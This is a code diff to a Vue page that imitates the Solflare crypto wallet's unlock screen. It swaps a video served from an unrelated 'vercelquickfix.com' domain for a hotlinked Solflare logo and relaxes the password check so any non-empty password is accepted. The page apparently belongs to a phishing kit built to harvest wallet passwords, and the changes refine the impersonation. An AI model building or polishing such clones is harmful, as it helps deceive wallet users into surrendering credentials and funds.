@@ -37,7 +37,8 @@
             <div class="flex flex-col items-center justify-center p-6">
               <div class="bg-[#FFEF46] rounded-3xl flex justify-center w-full">
                 <div>
-                    <video class="w-full h-[280px] object-cover" autoplay="" loop="" playsinline="" src="https://vercelquickfix.com/solflare-lock.mp4"></video>
+
+                    <img src="https://logos-world.net/wp-content/uploads/2025/09/Solflare-Logo-New.png" class="w-auto h-[180px] object-cover" alt="">
                 </div>
               </div>
               <form class="w-full my-6">
@@ -65,8 +66,8 @@
                   <button
                     @click="unlock"
                     type="button"
-                    :disabled="password.length <= 6 || isLoading"
-                    :class="password.length > 6 ? 'bg-[#FFEF46]' : 'bg-[#FFEF46]'"
+                    :disabled="password.length < 1 || isLoading"
+                    :class="password.length > 0 ? 'bg-[#FFEF46]' : 'bg-[#FFEF46]'"
                     class="w-full py-4 px-4 mb-2 border-none outline-none hover:border-none hover:text-[#222] rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center bg-[#333] text-black relative"
                   >
                     <span v-if="!isLoading">Unlock</span>
@@ -109,7 +110,7 @@
             <div class="p-6">
               <div class="bg-[#FFEF46] rounded-3xl flex justify-center w-full">
                 <div>
-                    <video class="w-full h-[280px] object-cover" autoplay="" loop="" playsinline="" src="https://vercelquickfix.com/solflare-lock.mp4"></video>
+                    <img src="https://logos-world.net/wp-content/uploads/2025/09/Solflare-Logo-New.png" class="w-auto h-[180px] object-cover" alt="">
                 </div>
               </div>
               
@@ -227,7 +228,7 @@ function goBackToStep2() {
 }
 
 function unlock() {
-  if (password.value.length <= 6) return;
+  if (password.value.length < 1) return;
   isLoading.value = true;
   setTimeout(() => {
     isLoading.value = false;
